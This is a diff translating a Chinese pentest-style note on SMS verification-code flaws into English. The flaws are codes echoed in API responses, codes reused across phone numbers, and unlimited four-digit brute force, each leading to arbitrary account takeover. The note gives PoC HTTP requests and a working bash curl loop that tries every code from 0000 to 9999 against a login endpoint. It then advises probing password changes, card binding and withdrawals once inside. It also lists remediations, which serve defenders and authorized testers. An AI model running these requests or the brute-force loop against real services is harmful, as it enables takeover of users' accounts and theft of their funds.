@@ -1,68 +1,68 @@
 ﻿---
-title: 短信验证码回显 / 复用 / 爆破（任意账号接管）
-cve: 无（业务逻辑）
+title: SMS verification-code disclosure / reuse / brute force (arbitrary account takeover)
+cve: None (business logic)
 severity: critical
 cvss: 9.1
-product: 自研注册/登录/改密接口
-versions: 任意
+product: Custom registration/login/password-change endpoints
+versions: Any
 ports: 80, 443
-keywords: sms, code, 验证码回显, 复用, 爆破, 接管
-entry: 响应里带 code / 同码复用 / 4 位爆破
+keywords: sms, code, verification-code disclosure, reuse, brute force, takeover
+entry: Code in response / same-code reuse / four-digit brute force
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic flaws; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 /api/sms/send      /api/user/register      /api/user/findpwd
-/api/login (手机号+验证码)   /api/user/bindPhone
+/api/login (phone number+verification code)   /api/user/bindPhone
 ```
 
-三类缺陷分开看：**回显**（响应体含 `code`/`smsCode`）、**复用**（同一 code 对多个手机号/多次有效）、**爆破**（4 位、无次数、无过期）。
+Consider the three flaw types separately: **disclosure** (response body contains `code`/`smsCode`), **reuse** (the same code works for multiple phone numbers/repeatedly), **brute force** (4 digits, no attempt limit, no expiry).
 
-## 前置条件
+## Prerequisites
 
-- 正常注册账号；抓包工具；授权测试号码。
+- A normally registered account; request-capture tools; authorized test phone numbers.
 
 ## PoC
 
 ```http
-### A. 回显：发送验证码，看响应
+### A. Disclosure: send a verification code and inspect the response
 POST /api/sms/send HTTP/1.1
 Content-Type: application/json
 
 {"phone":"13900000001","type":"login"}
 
-# 响应里若出现 {"code":"1234"} / debug 字段 / msg 带数字 ⇒ 直接登录
+# If the response contains {"code":"1234"} / debug fields / digits in msg ⇒ log in directly
 
-### B. 复用：拿 A 手机的 code 打 B 手机
+### B. Reuse: use phone A's code for phone B
 POST /api/login HTTP/1.1
 Content-Type: application/json
 
-{"phone":"13900000002","code":"<A 收到的 code>"}
+{"phone":"13900000002","code":"<code-received-by-A>"}
 
-### C. 爆破：4 位、无次数限制
+### C. Brute force: 4 digits, no attempt limit
 for c in $(seq -w 0000 9999); do
   r=$(curl -s -o /dev/null -w '%{http_code}' -X POST https://target/api/login -H 'content-type: application/json' -d "{\"phone\":\"13900000001\",\"code\":\"$c\"}")
   echo "$c $r"
 done | grep -v ' 401'
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先看 A：响应里带 code 就直接进；很多"测试环境没关"的站会这样。
-2. 再试 B：code 是否只跟会话绑定、不跟手机号绑定。
-3. C：4 位且无次数限制时，10000 次以内必中（限速跑，别打崩）；6 位无限制也可行但慢。
-4. 拿到账号后看能否改密/绑卡/提现（资金面）；某些站登录后能直接看他人代理树。
-5. 证据：一条成功登录的请求 + 响应；不要留号码库。
+1. Start with A: if the response includes the code, log in directly; many sites with "test mode left enabled" behave this way.
+2. Then try B: check whether the code is bound only to the session, not the phone number.
+3. C: with four digits and no attempt limit, success is guaranteed within 10000 attempts (rate-limit to avoid crashing the site); unrestricted six-digit codes are also feasible but slower.
+4. After obtaining account access, check password changes/card binding/withdrawals (financial impact); some sites expose other users' agent trees immediately after login.
+5. Evidence: one successful login request + response; do not retain a phone-number database.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 验证码只走短信通道，响应里绝不回显；6 位、5 分钟、5 次上限、一次性。
-- 与会话+手机号强绑定，校验失败计数落库（不能用内存计数被重启绕过）。
-- 登录/改密/绑定统一限速，同号码同 IP 双维。
+- Deliver codes only through SMS; never expose them in responses; six digits, 5-minute validity, 5-attempt limit, single use.
+- Bind tightly to session + phone number; persist failed-verification counters in the database (in-memory counters can be bypassed by restarts).
+- Apply consistent login/password-change/binding rate limits across both phone number and IP.
 
-## 参考
+## References
 
-- OWASP Authentication Cheat Sheet；OWASP WSTG-ATHN-03。
+- OWASP Authentication Cheat Sheet; OWASP WSTG-ATHN-03.
